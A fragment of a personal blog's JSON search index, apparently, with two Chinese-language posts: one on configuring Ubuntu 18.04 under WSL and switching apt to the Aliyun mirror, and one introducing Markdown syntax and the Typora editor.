WSL，即Windows Subsystem for Linux，籍此可以直接在Windows 10上运行Ubuntu，安装便捷，启动快速，就决定是你了！\n系统配置（学习网址：CSDN博客）  安装好后首先设置root用户, 更换apt数据源  sudo passwd root su root cd /etc/apt cp sources.list sources.list.bak #备份配置文件 vim sources.list #编辑配置文件 将配置文件内容更改为阿里云镜像源  deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb-src http://mirrors.","title":"Ubuntu 18.04 LTS的配置与入门"},{"content":"2021年7月18日 了解Markdown Markdown是一种轻量级标记语言，属于HTML格式的一种，易读易写易更改，处处透着极简主义的影子。在GitHub等网站上使用极广，更可以跨平台使用。\nWindows桌面端软件选择 Web网页版有简书等知名博客网站可作记录，千挑万选后我选择了Typora。优点如下：\n 有中文版。这一点可能不足为道，因为菜单的语言并不影响我们的使用，然而，不支持中文意味着软件对中文输入法的适配甚至中文文本的显示都极为差劲，这一点是我由MarkdownPad的使用中发现的。 Typora支持即时渲染技术，非常方便新人学习熟练。 Typora可以将md文件导出为pdf格式作发布用，对于笔记爱好者来说成就感满满。  Markdown语法  区块引用\n 代码引用：\nprintf(\u0026quot;使用反引号包裹代码\u0026quot;)\nint main() { int a; scanf(\u0026#34;%d\u0026#34;,\u0026amp;a); printf(\u0026#34;%d\u0026#34;,a++); return 0; } emoji: :smile:\n公式： $$ lim_{x \\to\\infty} \\exp(-x) = 0 $$ 插入图片：\n","permalink":"https://shenyimings.github.io/post/1.markdown%E7%AC%94%E8%AE%B0%E5%AD%A6%E4%B9%A0/","summary":"2021年7月18日 了解Markdown Markdown是一种轻量级标记语言，属于HTML格式的一种，易读易写易更改，处处透着极简主义的影子。在GitHub等网站上使用极广，更可以跨平台使用。\nWindows桌面端软件选择 Web网页版有简书等知名博客网站可作记录，千挑万选后我选择了Typora。优点如下：\n 有中文版。这一点可能不足为道，因为菜单的语言并不影响我们的使用，然而，不支持中文意味着软件对中文输入法的适配甚至中文文本的显示都极为差劲，这一点是我由MarkdownPad的使用中发现的。 Typora支持即时渲染技术，非常方便新人学习熟练。 Typora可以将md文件导出为pdf格式作发布用，对于笔记爱好者来说成就感满满。  Markdown语法  区块引用\n 代码引用：\nprintf(\u0026quot;使用反引号包裹代码\u0026quot;)\nint main() { int a; scanf(\u0026#34;%d\u0026#34;,\u0026amp;a); printf(\u0026#34;%d\u0026#34;,a++); return 0; } emoji: :smile:\n公式： $$ lim_{x \\to\\infty} \\exp(-x) = 0 $$ 插入图片：","title":"学习Markdown语法"}]